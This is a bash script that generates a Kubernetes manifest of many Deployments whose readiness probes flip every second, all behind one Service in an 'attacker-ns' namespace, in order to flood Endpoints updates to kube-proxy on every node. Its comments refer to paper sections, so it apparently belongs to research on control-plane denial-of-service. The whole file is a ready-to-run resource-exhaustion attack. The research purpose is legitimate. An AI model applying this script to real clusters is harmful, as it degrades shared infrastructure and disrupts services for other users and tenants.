#!/usr/bin/env bash
#
# generate-endpoints-flood.sh
#
# Generates COUNT separate Deployments (one pod, one ReplicaSet, one
# Deployment each), each with a readiness probe that flips every second
# (same mechanism as attack3, Section 4.4, reused here for step one of
# Section 4.5). All pods share a common label so a single Service can
# select them, which is what makes their readiness flips propagate to
# an Endpoints object watched by kube-proxy on every node (step two,
# Section 4.5, pod<->endpoint<->service data dependency, Table 1).
#
# Usage: ./generate-endpoints-flood.sh [count]
#   count : number of Deployments to generate, default 100
#
# Output: endpoints-flood-generated.yaml, next to this script.

set -euo pipefail

COUNT="${1:-100}"
OUT_DIR="$(cd "$(dirname "$0")" && pwd)"
OUT_FILE="$OUT_DIR/endpoints-flood-generated.yaml"

> "$OUT_FILE"

for i in $(seq 1 "$COUNT"); do
    cat >> "$OUT_FILE" <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: endpoints-flood-${i}
  namespace: attacker-ns
  labels:
    attack: endpoints-flood
spec:
  replicas: 1
  selector:
    matchLabels:
      app: endpoints-flood-${i}
  template:
    metadata:
      labels:
        app: endpoints-flood-${i}
        attack: endpoints-flood
        group: endpoints-flood-target
    spec:
      nodeName: k8s-w1
      containers:
      - name: flooder
        image: busybox:1.36
        command: ["sleep", "infinity"]
        ports:
        - containerPort: 80
        readinessProbe:
          exec:
            command: ["sh", "-c", "test \$(( \$(date +%s) % 2 )) -eq 0"]
          periodSeconds: 1
          timeoutSeconds: 1
          failureThreshold: 1
          successThreshold: 1
        resources:
          requests:
            cpu: "10m"
            memory: "16Mi"
          limits:
            cpu: "50m"
            memory: "32Mi"
        securityContext:
          allowPrivilegeEscalation: false
          privileged: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 1000
          seccompProfile:
            type: RuntimeDefault
          capabilities:
            drop: ["ALL"]
---
EOF
done

cat >> "$OUT_FILE" <<EOF
apiVersion: v1
kind: Service
metadata:
  name: endpoints-flood-svc
  namespace: attacker-ns
  labels:
    attack: endpoints-flood
spec:
  selector:
    group: endpoints-flood-target
  ports:
  - port: 80
    targetPort: 80
EOF

echo "Generated ${COUNT} Deployments + 1 Service -> ${OUT_FILE}"
echo "Apply with:  kubectl apply -f ${OUT_FILE}"
echo "Remove with: kubectl delete deployment,service -n attacker-ns -l attack=endpoints-flood"
